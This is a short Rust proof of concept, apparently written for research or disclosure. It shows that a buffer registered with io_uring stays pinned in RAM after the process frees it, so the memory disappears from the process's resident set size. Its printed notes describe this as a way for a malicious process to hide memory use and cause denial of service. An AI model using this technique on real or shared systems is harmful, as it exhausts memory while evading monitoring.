// Demonstrates desync between system RAM and a process' resident set size (RSS)
// Trigger by dropping a pinned memory page


use crate::monitor;
use io_uring::IoUring;
use libc::iovec;
use std::io;

pub fn demo() {
    println!("Initialize 500 MB buffer");
    monitor::log_memory_stats("Pre-buffer allocation");

    // 500 MB
    let size = 1024 * 1024 * 500;
    let mut v = vec![0u8; size];

    let page_size = 4096;
    
    // touch every page to trigger lazy loading
    for i in (0..size).step_by(page_size) {
        v[i] = 1;
    }

    monitor::log_memory_stats("Pre-ghost (mapped)");

    println!("Pinning buffer in io_uring");

    let ptr = v.as_ptr();
    let ring = IoUring::new(8).expect("ring failed");
    unsafe {
        let iov = iovec {iov_base: ptr as *mut _, iov_len: size};
        ring.submitter().register_buffers(&[iov]).expect("register failed");
    }

    println!("Dropping/unmapping buffer");
    drop(v);

    monitor::log_memory_stats("Post-ghost (unmapped)");
  
    println!("After allocating the buffer, the available RAM should decrease by 500 MB");
    println!("When dropping the buffer, we see the process unmaps the RAM but the system RAM doesn't increase");
    println!("Allows a malicious process to take up RAM without being associated with the RAM");
    println!("If duplicated this allows for potential DoS opportunities");

    println!("\n Press enter to exit and release RAM");

    let mut _input = String::new();
    io::stdin().read_line(&mut _input).ok();
}
